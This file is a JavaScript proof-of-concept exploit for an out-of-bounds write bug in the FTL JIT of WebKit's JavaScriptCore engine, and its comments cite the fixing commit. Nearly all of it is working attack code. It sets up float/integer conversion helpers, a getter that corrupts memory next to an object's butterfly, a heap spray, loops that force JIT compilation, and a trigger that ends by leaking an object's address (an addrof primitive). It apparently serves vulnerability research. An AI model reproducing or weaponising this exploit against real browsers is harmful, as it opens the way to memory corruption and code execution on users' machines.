// RCE bug (accidentally?) fixed in refactoring
// https://github.com/WebKit/webkit/commit/ed2da807d3cf4b5706430e3c192e1df33836c93c
//
// OOB write in FTL-generated code, found by bkth's fuzzer.
//
// I never bothered to port to Safari, so this is JSC only. Run with --forceEagerCompilation=true
var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

var s = {};
function g(obj) {
    (function() {
        s = {};
        s.g = undefined;
        obj.f = obj.f;
        obj.z = 42;
    })();
}

var leakme = {a:42};

// This will be FTL-compiled
var getter = function(obj, key) {
    obj.x = obj;
    obj.x.a = obj;
    // This writes out of bounds, before the actual butterfly (3 slots off)
    // and leaves the actual slot uninitialized.
    obj.x.b = leakme;
    return obj[key];
};
//noFTL(getter);

// This should not be compiled (we can probably somehow make it work anyways)
function f() {
    var outer = [13.37,13.37];
    var foo = {get : getter}
    var proxy = new Proxy(outer, foo);
    outer.proxy = proxy;
    outer.ab = {};

    getter(outer,'proxy');
    delete outer.b;

    g(outer);
    // This line has to cause compilation of getter
    outer.proxy.ab;
    g(outer);
}
noFTL(f);
noDFG(f);

var spray = new Array(100000);
var spray_cnt = 0;
function dospray() {
    for (var i = 0; i < 1000; ++i) {
        spray[spray_cnt++] = [13.37+i,13.37,13.37,13.37,13.37,13.37,13.37];
    }
    for (var i = 0; i < spray_cnt; i += 2) {
        spray[i] = null;
    }
    gc();
}
dospray();

// compile
for (var i = 0; i < 56; i++)
    f();

// trigger
f();

for (var i = 1; i < spray_cnt; i += 2) {
    for (j = 1; j < 7; ++j) {
        if (spray[i][j] != 13.37 && typeof spray[i][j] !== 'undefined') {
            print("addrof(leakme) =", hex(f2i(spray[i][j])));
        }
    }
}
